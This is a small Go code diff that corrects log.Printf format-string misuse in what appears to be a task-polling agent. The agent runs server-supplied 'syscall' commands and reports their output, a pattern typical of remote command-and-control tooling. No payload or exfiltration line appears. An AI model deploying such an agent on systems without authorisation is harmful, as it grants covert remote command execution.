@@ -22,7 +22,7 @@ func buildResult(task Task, responded bool, updates map[string]any) Task {
 func submitResult(server string, agentID string, task Task, responded bool, updates map[string]any) {
 	result := buildResult(task, responded, updates)
 	_ = submitTaskResult(server, agentID, result)
-	log.Printf("Submitting task result for task ID " + taskValue(task, "task_id"))
+	log.Printf("Submitting task result for task ID %s", taskValue(task, "task_id"))
 }
 
 // processTask handles a single task and returns false when the agent should stop running.
@@ -32,7 +32,7 @@ func processTask(server string, agentID string, task Task) bool {
 	switch instruction {
 	case "syscall":
 		cmd := taskValue(task, "arg")
-		log.Printf("Running " + cmd + " for task ID " + taskValue(task, "task_id"))
+		log.Printf("Running %s for task ID %s", cmd, taskValue(task, "task_id"))
 
 		cmdout := GetCommandOutput(cmd)
 
